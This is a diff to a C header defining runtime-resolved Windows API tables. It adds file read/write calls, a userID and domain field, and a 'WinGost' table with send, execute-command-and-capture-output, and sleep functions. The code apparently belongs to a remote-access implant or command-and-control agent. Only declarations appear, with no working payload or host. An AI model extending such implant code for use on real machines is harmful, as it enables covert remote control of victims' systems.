@@ -76,6 +76,10 @@ typedef struct _KERNEL32_TABLE {
     WIN_API_FUNC(SetHandleInformation, BOOL, HANDLE hObject, DWORD dwMask, DWORD dwFlags);
     WIN_API_FUNC(ReadFile, BOOL, HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
     WIN_API_FUNC(GetLocalTime, VOID, LPSYSTEMTIME lpSystemTime);
+    WIN_API_FUNC(CreateFileA, HANDLE, LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+    WIN_API_FUNC(WriteFile, BOOL, HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+    WIN_API_FUNC(GetFileSize, DWORD, HANDLE hFile, LPDWORD lpFileSizeHigh);
+    WIN_API_FUNC(GetSystemTimePreciseAsFileTime, VOID, LPFILETIME lpSystemTimeAsFileTime);
     // WIN_API_FUNC(HeapAlloc, LPVOID, HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
     // WIN_API_FUNC(HeapFree, BOOL, HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
 } KERNEL32_TABLE, *PKERNEL32_TABLE;
@@ -90,7 +94,7 @@ typedef struct _WINGOST_TABLE {
     // Add WinGost function pointers here if needed
     CUSTOM_FUNC(gostSend, void, char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft);
     CUSTOM_FUNC(gostPrint, void, char* message, BOOL format, int message_len, PFUNCTION_TABLE ft);
-    CUSTOM_FUNC(gostExecute, BOOL, char* command, char* output, DWORD outputSize, PFUNCTION_TABLE ft);
+    CUSTOM_FUNC(gostExecute, BOOL, char* command, char* output, DWORD* outputSize, PFUNCTION_TABLE ft);
     CUSTOM_FUNC(gostSleep, int, BOOL Alertable, int DelayInterval); //DelayInterval take seconds , Alertable = FALSE
 
 } WINGOST_TABLE, *PWINGOST_TABLE;
@@ -113,4 +117,6 @@ typedef struct _FUNCTION_TABLE {
     WINHTTP_TABLE WinHttp;
     NTDLL_TABLE Ntdll;
     WINGOST_TABLE WinGost;
+    PWCHAR domain;
+    WCHAR userID[40]; // 8 hex Wchars + null terminator
 } FUNCTION_TABLE;
